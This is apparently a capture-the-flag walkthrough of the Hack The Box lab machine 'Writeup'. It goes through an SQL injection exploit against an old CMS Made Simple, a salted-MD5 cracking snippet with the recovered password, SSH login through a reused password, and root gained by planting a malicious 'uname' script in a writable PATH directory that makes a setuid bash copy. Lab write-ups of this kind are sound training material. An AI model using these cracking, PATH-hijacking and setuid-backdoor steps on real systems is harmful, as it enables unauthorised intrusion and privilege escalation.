[Writeup](https://www.hackthebox.eu/home/machines/profile/192) is an easy rated linux machine on Hackthebox by [jkr](https://www.hackthebox.eu/home/users/profile/77141). Old version of CMS made Simple was running on Port 80 which is vulnerable to SQL injection. Using the SQLi, hash and salt for user jkr was extracted and the hash was cracked. User Jkr has reused the password and I was able to login on the box using SSH. On the box, user jkr belonged to **staff** group, which has write permission on some directories which were included on the PATH variable, which was exploited in combination  with message of the day to get root shell on the box.

```
- Only two ports are open.
- Nmap ran a script called http-robots.txt and found a disallowed entry: **/writeup**.

# HTTP Service on Port 80

Takeaways
- Eeyore DoS protection script is in place to check for Dos attacks
- It watches for 40x errors and bans IP of the attacker.
- Found a email with a hostname: **jkr@writeup.htb**. Keeping in mind about the email, let us add writeup.htb to our hosts file.

## Fuzzing with ffuf
```console
reddevil@ubuntu:~/Documents/htb/retired/writeup$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://writeup.htb/FUZZ -e .txt,.php,.html

        /'___\  /'___\           /'___\

After a while, the website let us visit only web pages without having 40x error adding our IP on the block list. This must be the DoS protection the author was talking about.

## Visting /writeup from robots.txt
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704200724.png)
We have a page which have writeup for ypuffy, blue and writeup. It must be our lucky day. Let us check the writeup for the box writeup.

![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704200821.png)
Dang. It is incomplete. But we can notice a parameter called page on the address bar. I checked whether the parameter is vulnerable to LFI, but I did not find much.

## Looking at the page source
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704201244.png)
This is a instance of CMS made simple and from the copy right, we can assume that this might an old version of the CMS.

While checking for publicly available exploit, I found [one](https://www.exploit-db.com/exploits/46635) in exploit db for SQL injection which was published in 2019.

## Checking the exploit
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704203225.png)
We get a username,email, hash and a salt.

## Trying to crack the hash
Looking at the exploit, the hashing is done using md5(salt + password).
I didnot find appropriate mode on hashcat, so I used the code on the exploit to crack the hash.

```py
>>> def crack_password():
...     global password
...     global output
...     global wordlist
...     global salt
...     dict = open(wordlist)
...     for line in dict.readlines():
...         line = line.replace("\n", "")
...         if hashlib.md5(str(salt) + line).hexdigest() == password:
...             output += "\n[+] Password cracked: " + line
...             break
...     dict.close()

>>> wordlist='/usr/share/wordlists/rockyou.txt'                            
>>> salt = '5a599ef579066807'                                              
>>> password = '62def4866937f08cc13bab43bb14e6f7'
>>> output = ''
>>> crack_password()
>>> output
'\n[+] Password cracked: raykayjay9'
```
And we succesfully crack the password.

## Trying to login using SSH
Since we have a username and a password, let us try to login with SSH.
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704210409.png)
We login with the creds.

## Reading user.txt
```console
jkr@writeup:~$ cat user.txt 
d4e49************319f978
```


# Privilege Escalation
## Checking the content of the webserver
```console
jkr@writeup:/var/www/html$ ls -la
total 20
drwxr-xr-x 3 root     root     4096 Apr 24  2019 .
drwxr-xr-x 3 root     root     4096 Apr 19  2019 ..
-rw-r--r-- 1 root     root     3032 Apr 24  2019 index.html
-rw-r--r-- 1 root     root      310 Apr 24  2019 robots.txt
drwx------ 9 www-data www-data 4096 Apr 19  2019 writeup
```
We can not read the content of writeup as it is owned by www-data.

## Running linpeas
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704224309.png)
We are in group staff and that user have write permission inside `/usr/local/bin`,`/usr/local/games` and `/usr/local/sbin`. 

## Checking our path
```console
jkr@writeup:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
We have **/usr/local/bin** on the first place. If that is the case with the root user and we can find a binary that a root user is executing with relative path, we can perform path hijacking to get code execution.

## Running pspy
I uploaded pspy to check if there are any cronjobs.
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704224732.png)
- There is one cronjob running which runs as root every minute.
- Also when the users login using SSH, during the execution of message of the day, **uname** is executed as root and it has a relative path.
- Path is set for the root user and the **/usr/local/sbin** path is on the front.
- Since we have writeup permission on that path, we can create a malicious **uname** binary and the malicious binary will be executed when we login to the box using SSH.

So, let us create a malicious binary to get code execution as root when we log in.

## Content of uname
```console
#!/bin/bash

cp /bin/bash /tmp/bash
chmod 4777 /tmp/bash
```
I copied it to **/usr/local/sbin**.

## Logging out and logging in with SSH for the motd to run
```console
reddevil@ubuntu:~/Documents/htb/retired/writeup$ ssh jkr@writeup.htb
jkr@writeup.htb's password:

```
## Checking /tmp/bash
![imge](/assets/images/htb-boxes/writeup/Pasted image 20210704225151.png)
It exists and has setuid bit set on it.

## Getting a root shell
```console
jkr@writeup:/usr/local$ /tmp/bash -p
bash-4.4# id
uid=1000(jkr) gid=1000(jkr) euid=0(root) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

## Reading root.txt
```console
bash-4.4# cat /root/root.txt
eeba4*************198d7226
```
